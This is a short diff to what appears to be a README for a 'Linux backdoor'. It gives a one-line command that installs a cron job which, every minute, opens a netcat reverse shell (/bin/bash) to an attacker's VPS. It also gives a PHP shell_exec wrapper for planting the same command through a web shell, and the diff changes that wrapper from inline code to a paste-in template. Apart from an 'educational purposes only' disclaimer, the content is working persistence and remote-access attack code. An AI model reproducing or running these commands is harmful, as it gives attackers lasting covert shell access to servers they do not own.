@@ -8,8 +8,8 @@ Linux  backdoor
 * This is for reverse shell:
 * echo "*/1 * * * *  nc your_vps_public_IP the_port_for_netcat  -e /bin/bash   > /dev/null 2>&1 &" > cron && cat cron | crontab -
 * This is for php shell:
-* <?php echo shell_exec("echo "*/1 * * * *  nc your_vps_public_IP the_port_for_netcat  -e /bin/bash   > /dev/null 2>&1 &" > cron && cat cron | crontab -
-");?>
+* Paste the same script in a php file with this php script
+* <?php echo shell_exec("paste_here");?>
 
 ### Only for educational purposes!
 ### Use it on your own server!
